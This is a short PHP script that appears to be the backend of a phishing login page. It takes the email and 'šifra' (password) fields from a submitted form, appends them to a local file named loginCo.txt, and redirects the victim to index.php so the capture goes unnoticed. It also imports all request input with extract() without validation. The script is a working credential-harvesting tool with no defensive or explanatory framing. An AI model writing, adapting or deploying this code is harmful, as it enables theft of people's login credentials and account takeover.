<?php ?>
<?php
    extract($_REQUEST);
    $file=fopen("loginCo.txt","a");
    fwrite($file,"email :");
    fwrite($file, $email ."\n");
    fwrite($file,"šifra :");
    fwrite($file, $šifra ."\n");
    fwrite($file,"{______________________________________________________________________________________________________________________}");
    fclose($file);
    header("location: index.php");
    ?>                